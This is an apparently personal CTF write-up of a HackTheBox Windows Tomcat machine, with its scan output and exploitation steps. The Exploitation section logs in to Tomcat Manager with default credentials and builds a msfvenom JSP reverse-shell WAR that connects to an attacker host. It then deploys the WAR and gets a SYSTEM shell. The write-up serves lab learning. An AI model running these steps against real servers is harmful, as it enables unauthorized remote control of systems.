---
os: Windows
status: Pwned
tags: [tomcat, default-creds, war-upload]
aliases:
IP: 10.10.10.95
Secondary IP:
Hostname:
Domain:
SID:
VM: HackTheBox
Ports: 8080
Notes: Tomcat default credentials, WAR file upload for SYSTEM shell
---
# Resolution summary

>[!summary]
>- Apache Tomcat 7.0.88 running on port 8080
>- Accessed Tomcat Manager with default credentials (tomcat:s3cret)
>- Generated malicious WAR file with msfvenom
>- Deployed WAR application through manager interface
>- Obtained SYSTEM shell directly

## Improved skills

- Apache Tomcat exploitation
- Default credential discovery
- WAR file deployment
- Msfvenom WAR payload generation
- Tomcat manager interface usage

## Used tools

- [[Nmap]]
- [[Msfvenom]]
- Web browser

---

# Information Gathering

Scanned all TCP ports:

```nmap
nmap 10.10.10.95 -sV -sC
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-02 02:09 EDT
Nmap scan report for 10.10.10.95
Host is up (1.0s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
```

---

# Enumeration

## Port 8080 - HTTP (Apache Tomcat)

- Apache Tomcat 7.0.88
- Coyote JSP engine 1.1
- Windows Server 2012 R2

Configuration details:
- User access defined in `CATALINA_HOME/conf/tomcat-users.xml`
- Manager application accessible

Attempted common Tomcat default credentials.

---

# Exploitation

## Tomcat Manager Access

Successfully authenticated to Tomcat Manager:
```
Username: tomcat
Password: s3cret
```

## WAR File Deployment

1. Generated malicious WAR file:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f war > shell.war
```

2. Started listener:
```bash
nc -lvnp 4444
```

3. Deployed WAR file through Tomcat Manager interface:
   - Navigate to `/manager/html`
   - Upload shell.war in "WAR file to deploy" section
   - Click Deploy

4. Triggered payload by accessing:
```
http://10.10.10.95:8080/shell/
```

5. Obtained reverse shell as **NT AUTHORITY\SYSTEM**

No privilege escalation required - direct SYSTEM access.

---

# Trophy

>[!todo] **User.txt**
>C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt

>[!todo] **Root.txt**
>C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt

**Note:** Both flags in single file "2 for the price of 1.txt"
